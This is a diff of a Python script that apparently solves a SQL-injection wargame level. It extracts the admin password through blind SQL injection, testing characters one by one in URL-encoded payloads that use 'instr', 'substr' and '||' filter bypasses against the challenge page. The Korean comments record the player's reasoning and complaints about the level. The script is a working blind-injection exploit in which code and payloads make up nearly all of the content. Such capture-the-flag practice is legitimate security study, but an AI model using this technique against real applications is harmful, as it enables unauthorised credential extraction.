@@ -1,3 +1,5 @@
+#chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1234%27%20||!(id%20not%20like%20%27admin%27||length(pw)not%20like%208)%23
+
 import requests
 from dotenv import load_dotenv
 import os
@@ -14,26 +16,20 @@ candidate = ['0','1','2','3','4','5','6','7','8','9',
              'N','O','P','Q','R','S','T',
              'U','V','W','X','Y','Z',
              '!', '@', '#', '$', '%', '^', '&', '*']
+# all ascii
+# ascii = [chr(i) for i in range(32, 127)]
+# candidate = ascii
+pLength = 0
 
-url=os.environ.get('LOS_URL')+'chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1234%27%20or%20pw%20like%20%270%20%%27%23'
-
-headers = {
-    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
-}
+#instr의 중복문제를 생각해야함
 
 answer = ''
-# ?pw=1234%27%20or%20length(pw)=4%23 <- 같은 테이블에 있는 다른계정이라 range4 아님. 함정
-# ?pw=1234%27%20or%20id%20=%20%27admin%27%20and%20%20length(pw)=8%23 <- 이렇게, and가 먼저 연산된다는걸 유의해서 설계
-
-#아니 개 열받는게 like는 안되고 substr은된댄다 얼탱이가없어서
-#심지어 substr(pw,4)같은게 안됨(4번째부터 자르기) substr에 인수가 세개여야함 나진짜 너무화나서울어
 for i in range(0,8):
     for j in candidate:
-        url=os.environ.get('LOS_URL')+'chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1234%27%20or%20substr(pw,'+str(i+1)+',1)=%27'+j+'%27%23'
+        url=os.environ.get('LOS_URL')+'chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1234%27%20||!(id%20not%20like%20%27admin%27||instr(pw,%27'+j+'%27)%20not%20like%20'+str(i+1)+')%23'
         headers = {
             'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
         }
-        print(url)
         res=requests.get(url, headers=headers)
         if 'Hello admin' in res.text[:200]:
             answer += j
@@ -43,3 +39,7 @@ for i in range(0,8):
     print(answer)
 
 print(answer)
+
+#풀긴 풀었는데 좋은 문제는 아닌듯. 이러려면 guest와 admin의 pw가 같아야 성립하는 문제.
+#사실 그 내용은 if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem");  에서 명시되어 있기는 함.
+#하지만 php소스코드 없이 앞의 gui만 있다고 생각하면 그럭저럭 납득이 가긴 함.
